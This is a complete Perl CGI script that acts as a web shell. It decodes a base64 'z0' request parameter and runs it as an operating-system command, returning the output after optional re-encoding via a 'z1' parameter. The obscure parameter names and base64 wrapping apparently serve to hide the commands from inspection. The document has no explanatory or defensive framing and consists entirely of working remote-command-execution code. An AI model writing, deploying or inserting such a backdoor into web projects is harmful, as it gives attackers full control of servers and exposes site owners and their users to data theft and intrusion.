use strict;
use warnings;
use CGI;
use MIME::Base64;
use Encode qw(from_to);

my $q = CGI->new;

my $z0 = $q->param('z0') // '';
my $z1 = $q->param('z1') // '';

my $szCommand  = decode_base64($z0);
my $szEncoding = decode_base64($z1);

if ($szCommand) {
    my @aOutput = `$szCommand 2>&1`;
    my $nRetVal = $? >> 8;

    if ($nRetVal == 0) {
        foreach my $szLine (@aOutput) {
            if ($szEncoding && $szEncoding !~ /^utf-?8$/i) {
                eval { from_to($szLine, $szEncoding, 'utf-8') };
            }
            print $szLine;
        }
    } else {
        print "ret=$nRetVal";
    }
} else {
    print "No command provided.";
}